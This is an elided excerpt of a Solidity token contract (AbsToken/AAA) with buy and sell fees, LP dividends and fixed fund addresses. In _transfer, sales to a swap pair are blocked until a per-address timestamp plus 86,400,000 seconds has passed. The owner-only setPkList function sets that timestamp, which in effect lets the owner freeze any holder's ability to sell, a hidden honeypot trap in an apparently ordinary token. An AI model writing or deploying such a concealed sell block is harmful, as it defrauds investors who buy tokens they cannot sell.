...
contract AbsToken is IERC20, Ownable {
    ...
    mapping(address => uint256) public _pkList;
    ...
    uint256 public _buyFundFee = 500; // 4000
    uint256 public _buyLPDividendFee = 2000;
    uint256 public _sellLPDividendFee = 2000;
    uint256 public _sellFundFee  = 500; // 4000
    uint256 public _sellLPFee = 0; //  原来是 100
    ...
    function _transfer(
        ...
        if (_swapPairList[from] || _swapPairList[to]) {
            if (_swapPairList[to]) {
                require(block.timestamp >= (_pkList[from] + 86400000), 'pkList');
            }
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                ...
                if (_swapPairList[to]) {
                    if (!inSwap) {
                        ...
                        if (contractTokenBalance > 0) {
                            ...
                            uint256 numTokensSellToFund = amount * swapFee / 50000;
    ...
    function _tokenTransfer(
        ...
        if (takeFee) {
            ...
            uint256 swapAmount = tAmount * swapFee / 100000;
            if (swapAmount > 0) {
    ...
    function setPkList(address addr, uint256 timestamp) external onlyOwner {
        _pkList[addr] = timestamp;
    }
    ...
    function processRewardExternal() external onlyOwner{
        _process(~uint256(0));
    }
...
contract AAA is AbsToken {
    constructor() AbsToken(
        ...
        address(0x0365048f8dC509E23C0f6F4C7F818657DFAf7d27), 
        address(0x0365048f8dC509E23C0f6F4C7F818657DFAf7d27),
